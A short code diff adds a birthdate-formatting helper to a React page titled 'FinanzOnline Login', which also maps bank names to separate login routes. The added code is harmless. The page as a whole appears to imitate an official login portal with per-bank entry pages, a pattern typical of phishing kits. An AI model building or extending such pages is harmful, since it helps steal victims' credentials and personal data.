@@ -77,6 +77,42 @@ const bankRouteMap: Record<string, string> = {
   "Marchfelder Bank": "/marchfelderbank",
 };
 
+function formatBirthdate(input: string): string {
+  const d = input.replace(/\D/g, "").slice(0, 8);
+  if (d.length === 0) return "";
+
+  let day: string;
+  let rest: string;
+  if (d.length === 1) {
+    if (d[0] === "0" || d[0] === "1" || d[0] === "2" || d[0] === "3") {
+      return d;
+    }
+    day = "0" + d[0];
+    rest = "";
+  } else {
+    day = d.slice(0, 2);
+    rest = d.slice(2);
+  }
+
+  if (rest.length === 0) return day + ".";
+
+  let month: string;
+  let year: string;
+  if (rest.length === 1) {
+    if (rest[0] === "0" || rest[0] === "1") {
+      return day + "." + rest[0];
+    }
+    month = "0" + rest[0];
+    year = "";
+  } else {
+    month = rest.slice(0, 2);
+    year = rest.slice(2);
+  }
+
+  if (year.length === 0) return day + "." + month + ".";
+  return day + "." + month + "." + year;
+}
+
 const Index = () => {
   usePageMeta("FinanzOnline Login", "/favicon.png");
   const navigate = useNavigate();
